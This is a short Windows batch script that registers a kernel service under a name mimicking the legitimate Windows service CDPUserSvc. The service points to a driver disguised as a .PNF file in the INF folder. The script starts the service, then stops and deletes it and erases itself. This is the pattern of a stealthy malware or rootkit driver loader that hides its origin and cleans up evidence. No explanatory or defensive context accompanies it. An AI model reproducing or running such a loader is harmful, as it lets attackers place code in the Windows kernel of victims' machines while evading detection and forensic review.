@echo off
cd %~dp0
sc create CDPUserSvc_74ad3 binpath=C:\Windows\INF\oem19.PNF type=kernel
sc start CDPUserSvc_74ad3
sc stop CDPUserSvc_74ad3
sc delete CDPUserSvc_74ad3
del "%~f0"